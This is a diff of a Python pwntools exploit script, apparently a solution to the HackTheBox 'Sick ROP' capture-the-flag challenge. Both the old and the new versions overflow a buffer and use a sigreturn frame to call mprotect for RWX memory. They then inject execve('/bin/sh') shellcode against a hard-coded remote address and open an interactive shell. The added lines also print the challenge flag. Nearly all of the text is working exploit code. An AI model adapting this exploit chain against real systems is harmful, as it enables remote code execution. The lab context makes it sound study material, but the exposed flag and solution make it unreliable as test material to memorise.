@@ -1,65 +1,64 @@
+# credit: https://corruptedprotocol.medium.com/sickrop-hackthebox-introduction-to-sigreturn-oriented-programming-srop-8b27727cd441
+# Helped with using vuln() pointer instead of function. 
+# Helped with placing "C" padding on 2nd payload instead of 1st.
+
 from pwn import *
+context.clear(arch='amd64')
 context.terminal = ['tmux','splitw' ,'-h']
-context.arch = "amd64"
-#context.log_level = 'debug'
 
-r = remote("206.189.125.80", 31772)
-#r = gdb.debug("./sick_rop", "break vuln")
-#r = process("./sick_rop")
-binary = ELF("./sick_rop")
+# HTB{why_st0p_wh3n_y0u_cAn_s1GRoP!?}
 
-# set the value of RAX
-def set_rax(num):
-	# need to -1 due to '\n' will be include in read()
-	r.sendline(b'A' * (num - 1))
-	r.recv()	# wait for input's echo due to write()
+#p = process("./sick_rop")
+#p = gdb.debug("./sick_rop", "break vuln")
+p = remote("206.189.125.216", 31912)
 
+# 23 bytes
+shellcode = (b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05")
 
-# buffer space + RSP space
-OFFSET_TO_RET = 0x20 + 0x8
-padding = b'A' * OFFSET_TO_RET
+# Find a function pointer's memory address by searching function's memory address as a value
+# within another memory address.
+# gef➤  grep 0x40102e <- vuln()
+# [+] Searching '\x2e\x10\x40' in memory
+# [+] In '/home/fresh/CTF/htb/sick_ROP/sick_rop'(0x401000-0x402000), permission=r-x
+#   0x4010d8 - 0x4010e4  →   "\x2e\x10\x40[...]" 
+vuln_pointer = 0x4010d8
+syscall = 0x401014
+vuln  = p64(0x40102e)
+rwx = 0x400000
 
-# ROPgadget --binary ./sick_rop --only "syscall"
-syscall_addr = 0x401014
-# pwndbg> search -p 0x40102E
-vuln_ptr = 0x4010d8
+# https://docs.pwntools.com/en/stable/rop/srop.html
+# mprotect(writable, 0x4000, 7)
+frame = SigreturnFrame(kernel="amd64")
+frame.rax = 10
+frame.rdi = rwx
+frame.rsi = 0x4000
+frame.rdx = 7
+frame.rsp = vuln_pointer  # Notes below for vuln_pointer instead of vuln() address.
+frame.rip = syscall
 
-shellcode =  """mov rdi, 0x68732f6e69622f
-                push rdi
-                mov rdi, rsp
-                mov rax, 0x3b
-                xor rsi, rsi
-                xor rdx, rdx
-                syscall"""
-assembled_shellcode = asm(shellcode)
+# Why not vuln function but a pointer to vuln?
+# Stack frames changed. Calling the vuln function directly will not get us to that function
 
+# 1. Padding
+# 2. ret2vuln() to adjust RAX to 0xf with 2nd payload
+# 3. 'syscall; ret' gadget to use sigreturn()
+# 4. bytes(frame) sets up the stack after sigreturn() is called and 
+#    return to vuln() for 3rd run for final payload(3).
+payload1 = b"A"*40 + vuln + p64(syscall) + bytes(frame)
 
-####### To call mprotect() to allow writing of shellcode #######
-frame = SigreturnFrame()
-frame.rax = constants.SYS_mprotect
-# All arguments for mprotect syscall
-frame.rdi = 0x400000	# Virtual address of binary
-frame.rsi = 0x10000	# length of space to change its protection
-frame.rdx = 0x7		# set protection to allow RWX
-# new RSP must be a pointer to vuln() to jump to it for the next BoF
-frame.rsp = vuln_ptr
-# Address of Syscall Instruction
-frame.rip = syscall_addr
+p.sendline(payload1)
+p.recv()
 
-log.info("Changing permission for this address for shellcode: " + hex(frame.rdi))
-log.info("New RSP address: " + hex(frame.rsp))
+# @ 2nd run of vuln()
+# Control number in RAX. 15(0xf) = sigreturn()
+payload2 = b"C"*15
+p.send(payload2)
+p.recv()
 
-# p64(binary.symbols['vuln']) is to set RAX to call SYS_sigreturn.
-payload = padding + p64(binary.symbols['vuln']) + p64(syscall_addr) + bytes(frame)
-r.sendline(payload)
-r.recv()	# wait for input's echo due to write()
-# set to 0xF so that calling syscall will call rt_sigreturn.
-set_rax(0xF)
+# Shellcode + Padding + ret2shellcodea
+# No leak/maths necessary, padding lands on same memory address.
+payload3 = shellcode + b"\x90"*17 + p64(0x4010b8)
 
-
-####### Input shellcode on stack and execute it #######
-# vuln_ptr+0x10: Location of shellcode after BoF
-payload2 = padding + p64(vuln_ptr+0x10) + assembled_shellcode
-r.sendline(payload2)
-r.recv()	# wait for input's echo due to write()
-
+p.send(payload3)
+p.recv()
+p.interactive()
